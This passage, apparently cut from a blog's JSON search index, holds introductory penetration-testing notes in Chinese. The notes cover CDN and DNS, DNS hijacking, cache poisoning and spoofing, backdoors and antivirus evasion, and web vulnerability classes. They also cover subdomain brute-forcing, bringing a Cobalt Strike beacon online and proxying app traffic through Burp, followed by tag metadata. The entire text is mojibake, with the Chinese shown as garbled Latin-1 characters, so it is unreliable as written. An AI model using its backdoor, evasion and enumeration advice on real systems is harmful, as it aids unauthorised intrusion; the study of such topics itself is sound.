l0ne1y.github.ioåœ°å€ï¼Œå‘ç°ipåœ°å€å˜æˆäº†1.2.3.4ã€‚ CDNæ˜¯ä»€ä¹ˆï¼Ÿä¸DNSçš„å…³ç³»ï¼ŸCDNçš„å…¨ç§°æ˜¯Content Delivery Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚CDNæ˜¯æ„å»ºåœ¨ç°æœ‰ç½‘ç»œåŸºç¡€ä¹‹ä¸Šçš„æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚CDNçš„å…³é”®æŠ€æœ¯ä¸»è¦æœ‰å†…å®¹å­˜å‚¨å’Œåˆ†å‘æŠ€æœ¯ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œç°åœ¨æœåŠ¡å™¨åœ¨åŒ—äº¬ï¼Œæ·±åœ³çš„ç”¨æˆ·æƒ³è¦è·å–æœåŠ¡å™¨ä¸Šçš„æ•°æ®å°±éœ€è¦è·¨è¶Šä¸€ä¸ªå¾ˆè¿œçš„è·ç¦»ï¼Œè¿™æ˜¾ç„¶å°±æ¯”åŒ—äº¬çš„ç”¨æˆ·è®¿é—®åŒ—äº¬çš„æœåŠ¡å™¨é€Ÿåº¦è¦æ…¢ã€‚ä½†æ˜¯ç°åœ¨æˆ‘ä»¬åœ¨æ·±åœ³å»ºç«‹ä¸€ä¸ªCDNæœåŠ¡å™¨ï¼Œä¸Šé¢ç¼“å­˜ä½ä¸€äº›æ•°æ®ï¼Œæ·±åœ³ç”¨æˆ·è®¿é—®æ—¶å…ˆè®¿é—®è¿™ä¸ªCDNæœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨ä¸Šæœ‰ç”¨æˆ·è¯·æ±‚çš„æ•°æ®å°±å¯ä»¥ç›´æ¥è¿”å›ï¼Œè¿™æ ·é€Ÿåº¦å°±å¤§å¤§çš„æå‡äº†ã€‚ CDNå®é™…ä¸Šæ˜¯ä¸€ä¸ªå°±è¿‘è®¿é—®ï¼Œé‚£ä¹ˆç°åœ¨æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬æ€ä¹ˆçŸ¥é“ç”¨æˆ·çš„æ‰€åœ¨ä½ç½®ä»è€Œç»™ä»–åˆ†é…æœ€ä½³çš„CDNèŠ‚ç‚¹å‘¢ã€‚è¿™å°±éœ€è¦DNSæœåŠ¡æ¥è¿›è¡Œå®šä½äº†ã€‚å½“æˆ‘ä»¬é€šè¿‡ä½¿ç”¨DNSæœåŠ¡çš„æ—¶å€™ï¼Œå¯ä»¥æ ¹æ®ä»–ä½¿ç”¨çš„LDNSæœåŠ¡å™¨æ¥è¿›è¡Œä¸€ä¸ªå®šä½ï¼Œä¾‹å¦‚æˆ‘ä»¬çš„è°ƒåº¦æœåŠ¡å™¨çœ‹åˆ°ä»–æ˜¯æ¥è‡ªæ·±åœ³ç”µä¿¡çš„LDNSæœåŠ¡å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è®¤ä¸ºè¯¥ç”¨æˆ·æ¥è‡ªæ·±åœ³ç”µä¿¡ï¼Œç„¶åè°ƒåº¦æœåŠ¡å™¨å¯ä»¥è®©è¯¥ç”¨æˆ·å»è®¿é—®æ·±åœ³ç”µä¿¡çš„CDNæœåŠ¡å™¨ï¼Œè¿™æ ·å°±è®©ç”¨æˆ·è®¿é—®åˆ°äº†æœ€ä¼˜çš„CDNèŠ‚ç‚¹ã€‚é€šè¿‡DNSæœåŠ¡æˆ‘ä»¬å¯ä»¥å¾ˆå¿«çš„å®šä½åˆ°ç”¨æˆ·çš„ä½ç½®ï¼Œç„¶åç»™ç”¨æˆ·åˆ†é…æœ€ä½³CDNèŠ‚ç‚¹. å¸¸è§çš„DNSå®‰å…¨æ”»å‡»æœ‰å“ªäº›? åŸŸååŠ«æŒ é€šè¿‡é‡‡ç”¨é»‘å®¢æ‰‹æ®µæ§åˆ¶äº†åŸŸåç®¡ç†å¯†ç å’ŒåŸŸåç®¡ç†é‚®ç®±ï¼Œç„¶åå°†è¯¥åŸŸåçš„NSçºªå½•æŒ‡å‘åˆ°é»‘å®¢å¯ä»¥æ§åˆ¶çš„DNSæœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡åœ¨è¯¥DNSæœåŠ¡å™¨ä¸Šæ·»åŠ ç›¸åº”åŸŸåçºªå½•ï¼Œä»è€Œä½¿ç½‘æ°‘è®¿é—®è¯¥åŸŸåæ—¶ï¼Œè¿›å…¥äº†é»‘å®¢æ‰€æŒ‡å‘çš„å†…å®¹ã€‚è¿™æ˜¾ç„¶æ˜¯DNSæœåŠ¡æä¾›å•†çš„è´£ä»»ï¼Œç”¨æˆ·æŸæ‰‹æ— ç­–ã€‚ ç¼“å­˜æŠ•æ¯’ åˆ©ç”¨æ§åˆ¶DNSç¼“å­˜æœåŠ¡å™¨ï¼ŒæŠŠåŸæœ¬å‡†å¤‡è®¿é—®æŸç½‘ç«™çš„ç”¨æˆ·åœ¨ä¸çŸ¥ä¸è§‰ä¸­å¸¦åˆ°é»‘å®¢æŒ‡å‘çš„å…¶ä»–ç½‘ç«™ä¸Šã€‚å…¶å®ç°æ–¹å¼æœ‰å¤šç§ï¼Œæ¯”å¦‚å¯ä»¥é€šè¿‡åˆ©ç”¨ç½‘æ°‘ISPç«¯çš„DNSç¼“å­˜æœåŠ¡å™¨çš„æ¼æ´è¿›è¡Œæ”»å‡»æˆ–æ§åˆ¶ï¼Œä»è€Œæ”¹å˜è¯¥ISPå†…çš„ç”¨æˆ·è®¿é—®åŸŸåçš„å“åº”ç»“æœ;æˆ–è€…ï¼Œé»‘å®¢é€šè¿‡åˆ©ç”¨ç”¨æˆ·æƒå¨åŸŸåæœåŠ¡å™¨ä¸Šçš„æ¼æ´ï¼Œå¦‚å½“ç”¨æˆ·æƒå¨åŸŸåæœåŠ¡å™¨åŒæ—¶å¯ä»¥è¢«å½“ä½œç¼“å­˜æœåŠ¡å™¨ä½¿ç”¨ï¼Œé»‘å®¢å¯ä»¥å®ç°ç¼“å­˜æŠ•æ¯’ï¼Œå°†é”™è¯¯çš„åŸŸåçºªå½•å­˜å…¥ç¼“å­˜ä¸­ï¼Œä»è€Œä½¿æ‰€æœ‰ä½¿ç”¨è¯¥ç¼“å­˜æœåŠ¡å™¨çš„ç”¨æˆ·å¾—åˆ°é”™è¯¯çš„DNSè§£æç»“æœã€‚ 3)DDOSæ”»å‡» ä¸€ç§æ”»å‡»é’ˆå¯¹DNSæœåŠ¡å™¨è½¯ä»¶æœ¬èº«ï¼Œé€šå¸¸åˆ©ç”¨BINDè½¯ä»¶ç¨‹åºä¸­çš„æ¼æ´ï¼Œå¯¼è‡´DNSæœåŠ¡å™¨å´©æºƒæˆ–æ‹’ç»æœåŠ¡;å¦ä¸€ç§æ”»å‡»çš„ç›®æ ‡ä¸æ˜¯DNSæœåŠ¡å™¨ï¼Œè€Œæ˜¯åˆ©ç”¨DNSæœåŠ¡å™¨ä½œä¸ºä¸­é—´çš„â€œæ”»å‡»æ”¾å¤§å™¨â€ï¼Œå»æ”»å‡»å…¶å®ƒäº’è”ç½‘ä¸Šçš„ä¸»æœºï¼Œå¯¼è‡´è¢«æ”»å‡»ä¸»æœºæ‹’ç»æœåŠ¡ã€‚ DNSæ¬ºéª— DNSæ¬ºéª—å°±æ˜¯æ”»å‡»è€…å†’å……åŸŸåæœåŠ¡å™¨çš„ä¸€ç§æ¬ºéª—è¡Œä¸ºã€‚ åŸç†ï¼šå¦‚æœå¯ä»¥å†’å……åŸŸåæœåŠ¡å™¨ï¼Œç„¶åæŠŠæŸ¥è¯¢çš„IPåœ°å€è®¾ä¸ºæ”»å‡»è€…çš„IPåœ°å€ï¼Œè¿™æ ·çš„è¯ï¼Œç”¨æˆ·ä¸Šç½‘å°±åªèƒ½çœ‹åˆ°æ”»å‡»è€…çš„ä¸»é¡µï¼Œè€Œä¸æ˜¯ç”¨æˆ·æƒ³è¦å–å¾—çš„ç½‘ç«™çš„ä¸»é¡µäº†ï¼Œè¿™å°±æ˜¯DNSæ¬ºéª—çš„åŸºæœ¬åŸç†ã€‚DNSæ¬ºéª—å…¶å®å¹¶ä¸æ˜¯çœŸçš„â€œé»‘æ‰â€äº†å¯¹æ–¹çš„ç½‘ç«™ï¼Œè€Œæ˜¯å†’åé¡¶æ›¿ã€æ‹›æ‘‡æ’éª—ç½¢äº†ã€‚ è„šæœ¬è¯­è¨€å¸¸è§çš„è„šæœ¬è¯­è¨€ç±»å‹æœ‰å“ªäº›ï¼Ÿè„šæœ¬è¯­è¨€åˆè¢«ç§°ä¸ºæ‰©å»ºçš„è¯­è¨€ï¼Œæˆ–è€…åŠ¨æ€è¯­è¨€ï¼Œæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œç”¨æ¥æ§åˆ¶è½¯ä»¶åº”ç”¨ç¨‹åºï¼Œè„šæœ¬é€šå¸¸ä»¥æ–‡æœ¬ï¼ˆå¦‚ASCII)ä¿å­˜ï¼Œåªåœ¨è¢«è°ƒç”¨æ—¶è¿›è¡Œè§£é‡Šæˆ–ç¼–è¯‘ã€‚Scalaã€JavaScriptï¼ŒVBScriptï¼ŒActionScriptï¼ŒMAXScriptï¼ŒASPï¼ŒJSPï¼ŒPHPï¼ŒSQLï¼ŒPerlï¼ŒShellï¼Œpythonï¼ŒRubyï¼ŒJavaFXï¼ŒLuaï¼ŒAutoItç­‰ ä¸åŒè„šæœ¬ç±»å‹ä¸å®‰å…¨æ¼æ´çš„å…³ç³»ï¼Ÿä¸åŒçš„è„šæœ¬è¯­è¨€å†³å®šäº†å®‰å…¨æ¼æ´çš„å¤šå°‘ã€‚ æ¼æ´æŒ–æ˜ä»£ç å®¡è®¡ä¸è„šæœ¬ç±»å‹çš„å…³ç³»ï¼ŸåŒä¸Š åé—¨ä»€ä¹ˆæ˜¯åé—¨ï¼Ÿæœ‰é‚£äº›åé—¨ï¼Ÿåé—¨æ˜¯æŒ‡ç»•è¿‡å®‰å…¨æ§åˆ¶è€Œè·å–å¯¹ç¨‹åºæˆ–ç³»ç»Ÿè®¿é—®æƒçš„æ–¹æ³•ã€‚åé—¨çš„æœ€ä¸»è¦ç›®çš„å°±æ˜¯æ–¹ä¾¿ä»¥åå†æ¬¡ç§˜å¯†è¿›å…¥æˆ–è€…æ§åˆ¶ç³»ç»Ÿã€‚æ ¹æ®å®ç°æ–¹å¼çš„ä¸åŒï¼Œå¯ä»¥å°†åé—¨åˆ†ä¸ºç½‘é¡µåé—¨ã€çº¿ç¨‹æ’å…¥åé—¨ã€æ‰©å±•åé—¨ã€C/S åé—¨å’Œè´¦æˆ·åé—¨ç­‰ç±»å‹ã€‚ åé—¨åœ¨å®‰å…¨æµ‹è¯•ä¸­çš„å®é™…æ„ä¹‰ï¼Ÿ(1)æ–¹ä¾¿ä¸‹æ¬¡æ›´æ–¹ä¾¿çš„è¿›æ¥ã€‚ (2)è·å–åˆ°ç›¸å…³æƒé™ä¹‹åï¼Œåé—¨ç›¸å½“äºä¸€ä¸ªç®¡é“ï¼Œä¾¿äºæ“ä½œã€‚ å…³äºåé—¨éœ€è¦äº†è§£é‚£äº›ï¼Ÿï¼ˆç©æ³•ï¼Œå…æ€ï¼‰å…æ€ï¼Œå°±æ˜¯ç»•è¿‡æ€æ¯’è½¯ä»¶çš„é˜²æŠ¤ï¼Œé¿å…è¢«æ£€æµ‹åˆ°ã€‚ WEBWEB çš„ç»„æˆæ¶æ„æ¨¡å‹ï¼Ÿç½‘ç«™æºç ï¼šåˆ†è„šæœ¬ç±»å‹ï¼Œåˆ†åº”ç”¨æ–¹å‘æ“ä½œç³»ç»Ÿï¼šwindows linuxä¸­é—´ä»¶ï¼ˆæ­å»ºå¹³å°ï¼‰ï¼šapache iis tomcat nginx ç­‰æ•°æ®åº“ï¼šaccess mysql mssql oracle sybase db2 postsql ç­‰ æ¶æ„æ¼æ´å®‰å…¨æµ‹è¯•ç®€è¦ä»‹ç»ï¼Ÿwebç½‘ç«™-æ•°æ®åº“æƒé™-æƒé™æå‡-å†…ç½‘ã€‚ ä¸ºä»€ä¹ˆè¦ä» WEB å±‚é¢ä¸ºä¸»ä¸ºé¦–ï¼Ÿä¸ç®¡æ˜¯PCè¿˜æ˜¯APPæœ¬è´¨ä¸Šéƒ½å¯ä»¥ä»¥webä¸ºçªç ´å£ã€‚ WEBç›¸å…³å®‰å…¨æ¼æ´WEB æºç ç±»å¯¹åº”æ¼æ´1234567SQL æ³¨å…¥æ–‡ä»¶ä¸Šä¼ XSSä»£ç æ‰§è¡Œå˜é‡è¦†ç›–é€»è¾‘æ¼æ´ååºåˆ—åŒ–ç­‰ WEB ä¸­é—´ä»¶å¯¹åº”æ¼æ´æœªæˆæƒè®¿é—®ç­‰ç­‰ WEB æ•°æ®åº“å¯¹åº”æ¼æ´å¼±å£ä»¤ç­‰ WEB ç³»ç»Ÿå±‚å¯¹åº”æ¼æ´ææƒç›¸å…³çš„ å…¶ä»–ç¬¬ä¸‰æ–¹å¯¹åº”æ¼æ´ç¬¬ä¸‰æ–¹è½¯ä»¶çš„ä¸€äº›æ¼æ´ eg:QQ APP æˆ– PC åº”ç”¨ç»“åˆç±» Appæˆ–è€…PCè½¯ä»¶çš„æ¼æ´ æ¼”ç¤ºæ¡ˆä¾‹å¤šçº§åŸŸåçš„æšä¸¾æŸ¥æ‰¾1.ç›´æ¥ç™¾åº¦ 2.é€šè¿‡å·¥å…·è¿›è¡Œçˆ†ç ´ è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯Layerå­åŸŸåçˆ†ç ´å·¥å…·ï¼Œä¸‹è½½é“¾æ¥æ˜¯https://github.com/euphrat1ca/LayerDomainFinderï¼Œå­—å…¸æ˜¯https://github.com/k8gege/PasswordDicã€‚ 3.åŸŸåæ³¨å†Œ æŸ¥è¯¢Aè®°å½•ã€MXè®°å½•ã€Cè®°å½• DNSè§£æä¿®æ”¹ååˆ†æï¼ˆæœ¬åœ°æˆ–æœåŠ¡ï¼‰å‰é¢æœ‰å®éªŒè¿‡ï¼Œè¿™é‡Œå°±ä¸å¼„äº†ã€‚ EXE åé—¨åŠŸèƒ½åŠå±å®³åŠç±»ä¼¼ WEB åé—¨è¿™é‡Œå› ä¸ºæ²¡æœ‰è§†é¢‘ä¸­çš„è½¯ä»¶ï¼Œæ‰€æœ‰æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯CSï¼Œè¿›è¡Œä¸Šçº¿ã€‚ å…³äºCSå…·ä½“æ“ä½œå¯ä»¥çœ‹https://soapffz.com/sec/483.html å¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šçº¿äº†ã€‚ APPç±»ç»“åˆWEBåè®®ï¼ŒPCç±»ç»“åˆWEBåè®®æ‰‹æœºæ¨¡æ‹Ÿå™¨ éœ€è¦è®¾ç½®ä»£ç†ï¼Œä»£ç†ipä¸ºPCç«¯ipã€‚ PCç«¯éœ€è¦é€šè¿‡burp suiteè¿›è¡ŒæŠ“åŒ…ï¼Œè®¾ç½®brupç›‘å¬ç«¯å£ä¸ºä»£ç†æœåŠ¡å™¨ç«¯å£ã€‚ ä¹‹åä¿®æ”¹æ•°æ®åŒ…ï¼Œä¿®æ”¹ç”µè„‘æ•°æ®åŒ…å’Œæ‰‹æœºç«¯ä¸€è‡´ï¼Œä»appåˆ†ç¦»å‡ºWEB æµ‹è¯•æ¼æ´ã€‚","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"åŸºç¡€å…¥é—¨","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]}],"categories":[],"tags":[{"name":"XML","slug":"XML","permalink":"https://al0nez.github.io/tags/XML/"},{"name":"DTD","slug":"DTD","permalink":"https://al0nez.github.io/tags/DTD/"},{"name":"XXE","slug":"XXE","permalink":"https://al0nez.github.io/tags/XXE/"},{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","permalink":"https://al0nez.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"é€»è¾‘è¶Šæƒ","slug":"é€»è¾‘è¶Šæƒ","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"},{"name":"æ–‡ä»¶ä¸‹è½½","slug":"æ–‡ä»¶ä¸‹è½½","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"ä»£ç æ‰§è¡Œ","slug":"ä»£ç æ‰§è¡Œ","permalink":"https://al0nez.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"https://al0nez.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CSRF","slug":"CSRF","permalink":"https://al0nez.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://al0nez.github.io/tags/SSRF/"},{"name":"XSSè·¨ç«™","slug":"XSSè·¨ç«™","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"åŸºç¡€å…¥é—¨","slug":"åŸºç¡€å…¥é—¨","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]}